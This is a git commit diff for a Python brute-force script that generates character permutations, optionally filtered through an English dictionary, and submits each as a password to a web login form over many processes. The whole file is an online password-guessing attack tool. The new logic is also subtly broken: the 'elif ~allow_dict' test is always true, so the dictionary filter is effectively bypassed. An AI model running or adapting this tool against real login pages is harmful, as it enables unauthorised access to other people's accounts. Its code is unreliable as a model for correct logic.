00b63f9bf5d8757d7d76bf272e0e3ac30cbbc1ce
michael34435 <michael34435@gamil.com>
2014-05-07 23:30:35 +0800

    upper char and numeric value be an option, add enchant dict

--- bruteforce.py
+++ bruteforce.py
@@ -1,7 +1,24 @@
-import itertools, urllib, urllib2, sys, multiprocessing, os, signal
+import itertools, urllib, urllib2, sys, multiprocessing, os, signal, enchant
+
+allow_number = False
+allow_uppercase = False
+allow_dict = True
+
+dictstring = 'abcdefghijklmnopqrstuvwxyz_'
+
+if allow_number:
+    dictstring += '0123456789'
+    pass
+
+if allow_uppercase:
+    dictstring += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+    pass
+
+uk = enchant.Dict("en_UK")
+us = enchant.Dict("en_US")
 
 def brute(i, url = '', form = 'account', form1 = 'password', account = ''):
-	work(itertools.permutations('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_', i), url, form, form1, account)
+	work(itertools.permutations(dictstring, i), url, form, form1, account)
 
 if __name__ == '__main__':
     jobs = []
@@ -35,11 +52,17 @@ if __name__ == '__main__':
         p.start()
 
 def work(res, url, form, form1, account):
-	for n in res:
-		password = ''.join(n)
-		send(url, form, form1, account, password)
-		pass
-	pass
+    for n in res:
+        password = ''.join(n)
+        if allow_dict and filter_dict(password):
+            send(url, form, form1, account, password)
+        elif ~allow_dict:
+            send(url, form, form1, account, password)
+        else:
+            continue
+            pass
+        pass
+    pass
 
 # form => password filed
 def send(url, form, form1, account, password):
@@ -52,4 +75,13 @@ def send(url, form, form1, account, password):
 	except Exception, e:
 		''
 	pass
-		
+
+def filter_dict(words):
+    s = ''
+    for x in words:
+        s += x
+        if len(s) > 2 and (uk.check(s) or us.check(s)):
+            return True
+            pass
+        pass
+    pass
